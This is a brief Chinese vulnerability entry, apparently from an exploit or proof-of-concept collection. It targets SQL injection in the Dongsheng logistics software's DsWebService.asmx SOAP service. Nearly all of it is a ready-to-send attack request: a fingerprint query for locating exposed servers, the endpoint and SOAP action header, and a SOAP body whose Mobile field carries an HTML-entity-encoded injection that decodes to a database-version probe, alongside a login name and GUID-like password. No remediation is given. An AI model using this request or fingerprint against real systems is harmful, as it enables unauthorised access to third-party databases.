# 东胜物流软件DsWebService.asmx存在SQL注入漏洞

- **系统**：东胜物流软件　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="东胜物流软件-物流软件"`
- **请求**：`POST /Webservice/DsWebService.asmx HTTP/1.1`
- **关键头**：`Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/GetS…`

**请求体 / payload**
```
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
<soap:Header/>
<soap:Body>
<dsw:GetSeaiBsDataList>
<!--Optional:-->
<dsw:LoginName>qdtaize</dsw:LoginName>
<!--Optional:-->
<dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>
<!--Optional:-->
<dsw:Mobile>&#x31;&#x27;&#x29;&#x20;&#x6f;&#x72;&#x20;&#x31;&#x3d;&#x40;&#x40;&#x56;&#x45;&#x52;&#x53;&#x49;&#x4f;&#x4e;&#x2d;&#x2d;</dsw:Mobile>
<!--Optional:-->
<dsw:Mblno>1</dsw:Mblno>
<dsw:start>1</dsw:start>
<dsw:limit>1</dsw:limit>
</dsw:GetSeaiBsDataList>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—